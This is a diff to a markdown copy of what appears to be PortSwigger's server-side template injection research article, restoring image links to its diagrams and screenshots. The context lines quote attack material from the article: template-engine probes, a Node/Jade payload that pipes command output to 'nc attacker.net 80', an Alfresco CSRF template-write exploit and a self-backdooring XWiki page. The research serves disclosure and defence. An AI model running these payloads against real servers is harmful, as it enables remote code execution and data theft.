@@ -120,7 +120,7 @@ The 'Server-Side' qualifier is used to distinguish this from vulnerabilities in 
 
 I have defined the following high level methodology to capture an efficient attack process, based on my experience auditing a range of vulnerable applications and template engines:
 
-!
+![](https://portswigger.net/cms/images/migration/blog/pretty-methodology-diagram.png)
 
 ### Detect
 
@@ -162,7 +162,7 @@ Hello user01 <tag> `
 
 After detecting template injection, the next step is to identify the template engine in use. This step is sometimes as trivial as submitting invalid syntax, as template engines may identify themselves in the resulting error messages. However, this technique fails when error messages are supressed, and isn't well suited for automation. We have instead automated this in Burp Suite using a decision tree of language-specific payloads. Green and red arrows represent 'success' and 'failure' responses respectively. In some cases, a single payload can have multiple distinct success responses - for example, the probe {{7*'7'}} would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use.
 
-!
+![](https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png)
 
 ### Exploit
 
@@ -231,7 +231,7 @@ This built-in can be a security concern because the template author can create a
 
 Are there any useful classes implementing TemplateModel? Let's take a look at the JavaDoc:
 
-!
+![](https://portswigger.net/cms/images/migration/blog/3-implementing-classes.png)
 
 One of these class names stands out - Execute.
 
@@ -254,7 +254,7 @@ This payload will come in useful later.
 
 [Velocity](https://velocity.apache.org/), another popular Java templating language, is trickier to exploit. There is no 'Security Considerations' page to helpfully point out the most dangerous functions, and also no obvious list of default variables. The following screenshot shows the Burp Intruder tool being used to bruteforce variable names, with the variable name on the left in the 'payload' column and the server's output on the right.
 
-!
+![](https://portswigger.net/cms/images/migration/blog/1-variable-bruteforce.png)
 
 The class variable (highlighted) looks particularly promising because it returns a generic Object. Googling it leads us to https://velocity.apache.org/tools/releases/2.0/summary.html:
 
@@ -291,7 +291,7 @@ tomcat7`
 
 [Smarty](http://www.smarty.net/) is one of the most popular PHP template languages, and offers [a secure mode](http://www.smarty.net/docs/en/advanced.features.tpl#advanced.features.security) for untrusted template execution. This enforces a whitelist of safe PHP functions, so templates can't directly invoke system(). However, it doesn't prevent us from invoking methods on any classes we can obtain a reference to. The documentation reveals that the $smarty builtin variable can be used to access various environment variables, including the location of the current file at $SCRIPT_NAME. Variable name bruteforcing quickly reveals the self object, which is a reference to the current template. There is very little documentation on this, but the code is all on GitHub. The [getStreamVariable](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385) method is invaluable:
 
-!
+![](https://portswigger.net/cms/images/migration/blog/0-getstreamvariable-method.png)
 
 The getStreamVariable method can be used to read any file the server has read+write permission on:
 
@@ -460,7 +460,7 @@ Exploit:
 - x = x('child_process')
 = x.exec('id | nc attacker.net 80')`
 
-!
+![](https://portswigger.net/cms/images/migration/blog/8-exploit.png)
 
 ## Case study: Alfresco
 
@@ -480,7 +480,7 @@ do_csrf.send('{"prop_cm_name":"folder.get.html.ftl","prop_cm_content":"&lgt;#ass
 
 The GUID value of templates can change across installations, but it's easily visible to low privilege users via the 'Data Dictionary'. Also, the administrative user is fairly restricted in the actions they can take, unlike other applications where administrators are intentionally granted complete control over the webserver.
 
-!
+![](https://portswigger.net/cms/images/migration/blog/alfresco-exploit.png)
 
 Note that according to Alfresco's own documentation, SELinux will do nothing to confine the resulting shell:
 
@@ -532,7 +532,7 @@ We just need to wrap it with some code to grab the privileges of a passing admin
 
 As soon as a wiki page with this content is viewed by a user with programming rights, it will backdoor itself. Any user who subsequently views the page can use it to execute arbitrary shell commands:
 
-!
+![](https://portswigger.net/cms/images/migration/blog/5-exploit.png)
 
 Although I chose to exploit $doc.save, it is far from the only promising API method. Other potentially useful methods include $xwiki.getURLContent("http://internal-server.net"), $request.getCookie("password").getValue(), and $services.csrf.getToken().
 
